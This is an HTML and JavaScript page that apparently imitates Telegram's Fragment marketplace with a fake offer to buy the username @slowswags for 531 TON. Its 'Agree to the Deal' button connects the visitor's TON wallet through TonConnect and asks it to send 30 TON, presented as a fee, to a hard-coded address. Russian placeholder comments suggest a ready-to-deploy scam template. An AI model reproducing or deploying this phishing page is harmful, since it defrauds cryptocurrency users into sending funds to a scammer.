<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment - Confirm Offer</title>
    <style>
        :root {
            --tm-bg-dark: #1A2026;
            --tm-bg-dark-1: #293440;
            --tm-bg-dark-2: #293440;
            --tm-text-primary: #fff;
            --tm-text-secondary: #a1a1a1;
            --tm-text-blue: #00aff0;
            --tm-text-orange: #ff9500;
            --tm-btn-primary-bg: #00aff0;
            --tm-btn-primary-hover-bg: #0091c2;
            --tm-btn-radius: 5px;
            --tm-transition: all 0.3s ease;
        }

        body {
            background-color: var(--tm-bg-dark);
            color: var(--tm-text-primary);
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
        }

        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 400;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 500;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 700;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmWUlfBBc4.woff2') format('woff2');
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }

        .subscribe-link {
            position: absolute;
            top: 20px;
            right: 20px;
            color: var(--tm-text-blue);
            font-size: 14px;
            text-decoration: none;
        }

        .username-header {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .username-header h1 {
            font-size: 24px;
            font-weight: 700;
            margin: 0;
        }

        .status-taken {
            background-color: var(--tm-text-orange);
            color: var(--tm-text-primary);
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            text-transform: uppercase;
        }

        .content-wrapper {
            display: flex;
            justify-content: space-between;
            gap: 20px;
            margin-top: 20px;
        }

        .left-section {
            flex: 1;
        }

        .right-section {
            flex: 1;
        }

        .info-box {
            background-color: var(--tm-bg-dark-1);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .info-box p {
            font-size: 14px;
            color: var(--tm-text-primary);
            margin-bottom: 15px;
            line-height: 1.5;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-box p:last-child {
            margin-bottom: 0;
        }

        .info-box p::before {
            content: '•';
            color: var(--tm-text-blue);
            font-size: 18px;
        }

        .info-box p span {
            font-weight: 700;
            font-size: 16px;
            color: var(--tm-text-primary);
        }

        .details-box {
            background-color: var(--tm-bg-dark-1);
            padding: 15px;
            border-radius: 8px;
        }

        .details-table {
            width: 100%;
            border-spacing: 0;
            background: transparent;
        }

        .details-table th, .details-table td {
            padding: 5px 0;
            font-size: 14px;
        }

        .details-table th {
            color: var(--tm-text-primary);
            font-weight: 500;
            text-align: left;
            width: 40%;
        }

        .details-table td {
            color: var(--tm-text-blue);
            font-weight: 400;
            text-align: right;
        }

        .details-table td a {
            color: var(--tm-text-blue);
            text-decoration: none;
        }

        .btn-primary {
            background-color: var(--tm-btn-primary-bg);
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 500;
            width: 100%;
            border-radius: var(--tm-btn-radius);
            color: var(--tm-text-primary);
            cursor: pointer;
            transition: var(--tm-transition);
            margin-top: 15px;
        }

        .btn-primary:hover {
            background-color: var(--tm-btn-primary-hover-bg);
        }
    </style>
    <script src="https://unpkg.com/@tonconnect/sdk@1.0.0/dist/tonconnect-sdk.min.js"></script>
</head>
<body>
    <div class="container">
        <a href="https://t.me/skjfbqbot/fragmfdicvw" class="subscribe-link">Subscribe to updates</a>
        <div class="username-header">
            <h1>slowswags.t.me</h1>
            <span class="status-taken">Taken</span>
        </div>
        <div class="content-wrapper">
            <div class="left-section">
                <div class="info-box">
                    <p>You will receive: <span>531 TON</span> ($1717.68)</p>
                    <p>Transaction Fee: <span>31 TON</span> ($100.28)</p>
                </div>
                <button id="agree-button" class="btn-primary"> Agree to the Deal</button>
            </div>
            <div class="right-section">
                <div class="details-box">
                    <table class="details-table">
                        <tr>
                            <th>Telegram Username</th>
                            <td><a href="https://t.me/slowswags">@slowswags</a></td>
                        </tr>
                        <tr>
                            <th>Web Address</th>
                            <td><a href="https://t.me/slowswags">t.me/slowswags</a></td>
                        </tr>
                        <tr>
                            <th>TON Web 3.0 Address</th>
                            <td><a href="https://slowswags.t.me">slowswags.t.me</a></td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>
    <script>
        console.log('Script started');
        if (typeof TonConnect === 'undefined') {
            console.error('TonConnect SDK not loaded');
            alert('TonConnect SDK failed to load. Please check your network or script source.');
        } else {
            console.log('TonConnect SDK loaded successfully');
            const tonConnect = new TonConnect({
                manifestUrl: 'https://<ваш-username>.github.io/<репозиторий>/tonconnect-manifest.json' // Замените на ваш реальный URL
            });
            console.log('TonConnect initialized with manifest:', tonConnect);

            document.getElementById('agree-button').addEventListener('click', async () => {
                console.log('Button clicked');
                try {
                    console.log('Attempting to connect wallet...');
                    const wallet = await tonConnect.connect();
                    console.log('Connect result:', wallet);
                    if (!wallet) {
                        throw new Error('Wallet connection failed');
                    }
                    console.log('Wallet connected successfully:', wallet);

                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [
                            {
                                address: 'UQA7zv18rAEKJt85gvCVXLJRzGfagMPPnS5AaDGJlTYgYKSU',
                                amount: '30000000000', // 30 TON в нанотонах
                            },
                        ],
                    };
                    console.log('Preparing to send transaction:', transaction);

                    const result = await tonConnect.sendTransaction(transaction);
                    console.log('Transaction result:', result);
                    if (result) {
                        alert('Transaction sent successfully');
                    } else {
                        throw new Error('Transaction failed');
                    }
                } catch (error) {
                    console.error('Error during process:', error);
                    alert('Произошла ошибка: ' + error.message);
                }
            });
        }
    </script>
